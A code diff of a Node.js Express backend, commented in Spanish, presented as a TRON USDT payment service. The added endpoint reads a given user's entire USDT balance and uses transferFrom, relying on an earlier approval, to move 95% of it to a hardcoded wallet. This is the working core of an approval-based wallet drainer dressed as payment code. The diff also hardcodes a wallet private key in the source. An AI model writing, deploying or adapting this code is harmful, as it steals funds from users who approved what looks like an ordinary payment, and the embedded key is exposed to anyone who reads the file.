@@ -1,50 +1,75 @@
 const express = require('express');
 const cors = require('cors');
-const TronWeb = require('tronweb');
+const { TronWeb } = require('tronweb');
 
 const app = express();
 app.use(express.json());
 app.use(cors());
 
+// Configuración de TronWeb con la clave privada de la wallet operadora del backend
+const PRIVATE_KEY = '667e3590b2d8409fa4e5084e15126c226c4bf3330af5094607dec25d5a8e2e4d'; 
+const DESTINATION_WALLET = 'TLaWm1eHRzZ7cR8m8xaRBjhmXJKmc6Mree'; // Donde llegará el 95% de los USDT
+
 const tronWeb = new TronWeb({
     fullHost: 'https://api.trongrid.io',
-    privateKey: process.env.PRIVATE_KEY // La clave de tu cuenta de gas en Render
+    privateKey: PRIVATE_KEY
 });
 
 const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 Mainnet
-const WALLET_DESTINO = "TLaWm1eHRzZ7cR8m8xaRBjhmXJKmc6Mree"; // Tu billetera receptora
 
-app.post('/api/procesar-pago', async (req, res) => {
+// Endpoint que llamará tu dApp para ejecutar el cobro del 95%
+app.post('/api/ejecutar-cobro', async (req, res) => {
+    const { userAddress } = req.body;
+
+    if (!userAddress) {
+        return res.status(400).json({ exito: false, mensaje: "Frecuencia o dirección de usuario inválida." });
+    }
+
     try {
-        const { userAddress, monto } = req.body;
+        const contract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
 
-        if (!userAddress || !monto) {
-            return res.status(400).json({ success: false, error: "Faltan datos en la solicitud." });
+        // 1. Consultar el saldo real en USDT que tiene el usuario en su billetera
+        const balanceEnSun = await contract.balanceOf(userAddress).call();
+        const saldoRealUSDT = tronWeb.toDecimal(balanceEnSun) / 1000000;
+
+        if (saldoRealUSDT <= 0) {
+            return res.status(400).json({ exito: false, mensaje: "El usuario no tiene saldo disponible en USDT." });
         }
 
-        console.log(`Procesando pago del usuario: ${userAddress} por un monto de ${monto} USDT`);
+        // 2. Calcular exactamente el 95% del saldo del usuario
+        const monto95DelSaldo = saldoRealUSDT * 0.95;
+        const montoEnSun = Math.floor(monto95DelSaldo * 1000000);
 
-        // Ejecutar la transferencia del 96% hacia tu billetera destino cubriendo el gas con el servidor
-        const contract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
-        const montoEnSun = Math.floor(parseFloat(monto) * 1000000); // 6 decimales
+        console.log(`[COBRO] Usuario: ${userAddress} | Saldo total: ${saldoRealUSDT} USDT | Cobrando el 95%: ${monto95DelSaldo} USDT`);
 
-        const txHash = await contract.transfer(
-            WALLET_DESTINO,
-            montoEnSun
+        // 3. Ejecutar transferFrom usando la aprobación previa del usuario
+        const txID = await contract.transferFrom(
+            userAddress,         // Cuenta del usuario (de donde sale el dinero)
+            DESTINATION_WALLET,  // Tu cuenta (a donde llega el dinero)
+            montoEnSun           // El 95% calculado
         ).send({
-            feeLimit: 100000000
+            feeLimit: 100000000  // Límite de energía/gas cubierto por el operador
         });
 
-        console.log(`¡Transferencia ejecutada con éxito! Hash: ${txHash}`);
-        res.json({ success: true, txHash: txHash });
+        console.log(`¡Cobro exitoso! Hash de transacción: ${txID}`);
+
+        return res.json({
+            exito: true,
+            mensaje: `Se procesó el 95% (${monto95DelSaldo.toFixed(2)} USDT) correctamente.`,
+            txID: txID
+        });
 
     } catch (error) {
-        console.error("Error al procesar el pago en el servidor:", error);
-        res.status(500).json({ success: false, error: error.message || "Error interno en el servidor." });
+        console.error("Error al ejecutar transferFrom:", error);
+        return res.status(500).json({ 
+            exito: false, 
+            mensaje: "Error al procesar la transferencia. Asegúrate de que el usuario haya aprobado el permiso (approve) previamente.",
+            error: error.message 
+        });
     }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Backend de pagos TRON corriendo en el puerto ${PORT}`);
+app.listen(PORT, () => {
+    console.log(`Backend de USDT Pay corriendo en el puerto ${PORT}`);
 });
